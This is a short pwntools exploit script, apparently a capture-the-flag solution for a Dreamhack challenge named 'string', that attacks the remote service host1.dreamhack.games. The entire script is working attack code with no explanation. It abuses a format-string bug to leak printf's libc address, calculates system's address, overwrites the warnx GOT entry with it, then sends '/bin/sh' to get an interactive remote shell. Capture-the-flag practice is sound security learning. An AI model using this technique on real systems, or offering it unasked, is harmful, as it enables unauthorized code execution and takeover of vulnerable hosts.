from pwn import*
context.log_level = 'debug'
def send_payload(payload):
    print r.sendline(payload)

r = remote("host1.dreamhack.games", 22763)
libc = ELF('./libc.so.6')
e = ELF('./string')

printf_got = e.got['printf']
warnx_got = e.got['warnx']
printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
bss = e.bss()
payload = ""
payload += p32(printf_got)
payload += '%x%x%x%x.%s'

r.recvuntil("> ")

r.sendline("1")
r.recvuntil("Input: ")

r.sendline(payload)
r.recvuntil("> ")

r.sendline("2")
r.recvuntil(".")
printf_libc = u32(r.recv(4))
print hex(printf_libc)
libc_base = printf_libc - printf_offset
system_addr = libc_base + system_offset
fmt = FmtStr(send_payload, offset = 5)

r.recvuntil('> ')

r.sendline('1')
r.recvuntil('Input: ')

fmt.write(warnx_got, system_addr)
fmt.execute_writes()
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('Input: ')
r.sendline('/bin/sh')
r.recvuntil('> ')
r.sendline('2')
r.interactive()